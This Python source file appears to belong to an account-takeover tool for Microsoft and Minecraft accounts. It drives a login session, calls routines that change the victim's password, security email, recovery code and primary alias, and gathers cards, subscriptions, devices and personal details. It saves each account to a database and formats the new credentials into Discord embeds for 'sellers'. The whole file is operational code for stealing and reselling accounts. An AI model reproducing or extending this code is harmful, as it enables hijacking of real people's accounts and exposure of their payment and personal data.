from securing.utils.cookies.get_livedata import livedata
from securing.build_embeds import add_credential_line_field, build_account_embeds, build_failure_embed
from securing.auth.polish_host import polish_host
from securing.auth.get_msaauth import get_msaauth
from securing.utils.secure import secure
from securing.account_filters import rejection_reason
from securing.ban_checks import apply_ban_checks
from securing.utils.proxy import format_exception_reason, is_proxy_transport_error

from database.database import DBConnection
from discord import Embed
import asyncio
import httpx
import uuid
import time
import logging


def _reject_failure(email: str, reason: str, account: dict, *, credentials_changed: bool) -> dict:
    ms = (account or {}).get("microsoft") or {}
    mc = (account or {}).get("minecraft") or {}
    # Give-back failures must include the current primary when alias was replaced
    # (old email may already be deleted). Success seller embeds still hide sunny.
    sec = str(ms.get("security_email") or "").strip()
    pwd = str(ms.get("password") or "").strip()
    rec = str(ms.get("recovery_code") or "").strip()
    original = str(ms.get("original_email") or email or "").strip() or email
    primary = str(ms.get("email") or "").strip() or original
    replaced = ms.get("primary_alias_replaced")
    if replaced is None and primary.lower() != original.lower():
        replaced = True
    has_creds = bool(
        (sec and sec not in {"Couldn't Change!", "Unknown", "N/A", "?"})
        or (pwd and pwd not in {"Couldn't Change!", "Unknown", "N/A", "?"})
        or (rec and rec not in {"Couldn't Change!", "Unknown", "N/A", "?", "Failed to generate"})
        or replaced is True
    )
    # Recover / primary replace already changed login secrets — return them on reject
    # (primary-alias fail, UNVERIFIED, bans, filters, RecoverUser parse fail, etc.).
    if has_creds:
        credentials_changed = True

    # Prefer recover_error detail when RecoverUser blew up after sunny promote
    detail = str(ms.get("recover_error") or reason or "").strip() or reason

    ms_for_embed = {
        "email": primary,
        "original_email": original,
        "security_email": sec or "Couldn't Change!",
        "password": pwd or "Couldn't Change!",
        "recovery_code": rec or "Couldn't Change!",
        "username": mc.get("name"),
        "primary_alias_replaced": replaced,
    }
    fail_embed = build_failure_embed(
        original,
        ms_for_embed,
        reason,
        error=detail,
        credentials_changed=credentials_changed,
    )
    return {
        "failed": True,
        "reason": reason,
        "error": detail,
        "microsoft": {**ms, **ms_for_embed},
        "minecraft": mc,
        "credentials_changed": credentials_changed,
        "hit_embed": fail_embed,
        # Same embed for sellers on reject — they need the new creds to log in
        "seller_embed": fail_embed,
    }


async def startSecuringAccount(session: httpx.AsyncClient, email, device = None, code = None, recovery = True, ppft = None, rextra= None, command = False):
    # Handles the data to be displayed in embeds to discord
    
    print(f"Got 1")
    data = await livedata(session)
    msaauth = await get_msaauth(session, email, device, data, code, ppft)
    
    account = {
        "microsoft": {
            # Always seed with the email we logged in as — never leave
            # "Couldn't Change!" if a later step fails before alias replace.
            "email": email or "Couldn't Change!",
            "security_email": "Couldn't Change!",
            "password": "Couldn't Change!",
            "recovery_code": "Couldn't Change!",
            "auth_secret": "Disabled",
            "firstName": "Failed to Get",
            "lastName": "Failed to Get",
            "fullName": "Failed to Get",
            "region": "Failed to Get",
            "birthday": "Failed to Get",
            "language": "Failed to Get",
            "family": [],
            "devices": [],
            "cards": [],
            "subscriptions": {
                "active": [], 
                "canceled": [], 
                "commercial": []
            },
            "phones": [],
        },
        "minecraft": {
            "name": "No Minecraft",
            "method": "Not purchased",
            "gamertag": "Not Found",
            "uchange": "0 Days",
            "capes": "No capes",
            "SSID": False
        }
    }

    initialTime = time.time()

    if isinstance(msaauth, dict) and msaauth.get("_error"):
        return {"failed": True, "reason": msaauth["_error"]}

    if not msaauth:
        return {"failed": True, "reason": "Login failed — no MSAAUTH session."}
    
    if rextra:
        account["microsoft"]["password"] = rextra["password"]
        account["microsoft"]["security_email"] = rextra["security_email"]
        account["microsoft"]["recovery_code"] = rextra["recovery_code"]
    
    match msaauth:
        case "Recovery":
            print(f"[X] - Account requires account recovery")
            return {"failed": True, "reason": "Account requires Microsoft account recovery."}
        
        case "Family":
            print(f"[X] - Account is Family Locked")
            return {
                "failed": True,
                "reason": "Account is Family Locked (child/parental).",
            }
            
        case _:
            print(f"[+] - Got MSAAUTH")
            try:
                await polish_host(session, msaauth)
            except Exception:
                logging.exception("polish_host failed — continuing with existing cookies")
                print("[!] - polish_host raised; continuing with existing cookies")
            print(f"[~] - Polished MSAAUTH")
            # ReadTimeout / proxy flakes mid-secure are common after password
            # change — retry a few times before giving sellers a soft-fail embed.
            secure_attempts = 3
            last_secure_exc: BaseException | None = None
            for secure_try in range(1, secure_attempts + 1):
                try:
                    account = await secure(
                        session=session,
                        recovery=recovery,
                        account_info=account,
                        command=command,
                    )
                    last_secure_exc = None
                    break
                except Exception as exc:
                    last_secure_exc = exc
                    if is_proxy_transport_error(exc) and secure_try < secure_attempts:
                        logging.warning(
                            "secure() %s for %s (attempt %s/%s) — retrying",
                            exc.__class__.__name__,
                            email,
                            secure_try,
                            secure_attempts,
                        )
                        print(
                            f"[!] - secure() {exc.__class__.__name__} "
                            f"({secure_try}/{secure_attempts}) — retrying…"
                        )
                        await asyncio.sleep(1.5 * secure_try)
                        continue
                    break

            if last_secure_exc is not None:
                exc = last_secure_exc
                logging.exception("secure() crashed after login for %s", email)
                detail = format_exception_reason(exc)
                print(f"[X] - secure() crashed: {detail}")
                # Keep whatever credentials we already have in account_info
                if not isinstance(account, dict):
                    raise
                account.setdefault("microsoft", {})
                ms = account["microsoft"]
                if not ms.get("recover_error"):
                    ms["recover_error"] = detail
                # Primary may already be sunny@ — never fall through as a "success"
                # with an incomplete secure; give sellers the current primary back.
                creds_changed = bool(rextra) or (
                    ms.get("primary_alias_replaced") is True
                    or (
                        str(ms.get("password") or "")
                        not in ("", "Couldn't Change!", "Unknown")
                        and "UNVERIFIED" not in str(ms.get("password") or "")
                    )
                )
                if is_proxy_transport_error(exc):
                    reason = (
                        f"Securing step failed: {detail}. "
                        "Network/proxy timed out after login — credentials above "
                        "may already have changed; retry securing."
                    )
                else:
                    reason = f"Securing step failed: {detail}"
                return _reject_failure(
                    email,
                    reason,
                    account,
                    credentials_changed=creds_changed,
                )

    creds_changed = bool(rextra) or (
        str((account.get("microsoft") or {}).get("password") or "")
        not in ("", "Couldn't Change!", "Unknown")
        and "UNVERIFIED" not in str((account.get("microsoft") or {}).get("password") or "")
    )
    # After recover/secure, password is almost always changed when rextra is present
    if rextra:
        creds_changed = True
    if (account.get("microsoft") or {}).get("primary_alias_replaced") is True:
        creds_changed = True

    reject = rejection_reason(account)
    if reject:
        print(f"[X] - Rejected account: {reject}")
        logging.warning("Rejected secured account %s: %s", email, reject)
        return _reject_failure(email, reject, account, credentials_changed=creds_changed)

    ban_reject = await apply_ban_checks(account)
    if ban_reject:
        print(f"[X] - Banned account: {ban_reject}")
        logging.warning("Ban-check rejected %s: %s", email, ban_reject)
        return _reject_failure(email, ban_reject, account, credentials_changed=creds_changed)

    finalTime = (time.time() - initialTime)

    account_id = uuid.uuid4().hex
    with DBConnection() as db:
        db.add_secured_account(account_id, account)

    try:
        return await build_account_embeds(account, finalTime, account_id)
    except Exception as exc:
        logging.exception("build_account_embeds failed after securing")
        ms = account["microsoft"]
        hit_embed = Embed(
            title=f"Secured in {round(finalTime, 2)}s (embed partial)",
            description=f"Account secured but detail embed failed: `{exc.__class__.__name__}: {exc}`",
            color=0x279CF5,
        )
        hit_embed.add_field(name="Primary Email", value=f"```{ms.get('email', 'Unknown')}```", inline=False)
        hit_embed.add_field(name="Security Email", value=f"```{ms.get('security_email', 'Unknown')}```", inline=True)
        hit_embed.add_field(name="Password", value=f"```{ms.get('password', 'Unknown')}```", inline=True)
        hit_embed.add_field(name="Recovery Code", value=f"```{ms.get('recovery_code', 'Unknown')}```", inline=False)
        hit_embed.add_field(name="MC Username", value=f"```{account['minecraft'].get('name', 'Unknown')}```", inline=False)
        add_credential_line_field(
            hit_embed,
            email=ms.get("email", ""),
            recovery=ms.get("recovery_code", ""),
            password=ms.get("password", ""),
            security_email=ms.get("security_email", ""),
            username=account["minecraft"].get("name", ""),
        )
        return {
            "hit_embed": hit_embed,
            "account_id": account_id,
            "minecraft": account["minecraft"],
            "details": {
                "stats_embed": hit_embed,
                "ssid_embed": hit_embed,
                "info_embed": hit_embed,
                "xbox_embed": hit_embed,
                "family_embed": hit_embed,
                "devices_embed": hit_embed,
                "cards_embed": hit_embed,
                "subs_embed": hit_embed,
                "phones_embed": hit_embed,
                "account_details": (
                    f"**Username:** {account['minecraft'].get('name', 'Unknown')}\n"
                    f"**Email:** {ms.get('email', 'Unknown')}\n"
                    f"**Security Email:** {ms.get('security_email', 'Unknown')}\n"
                    f"**Password:** {ms.get('password', 'Unknown')}\n"
                    f"**Recovery Code:** {ms.get('recovery_code', 'Unknown')}"
                ),
            },
        }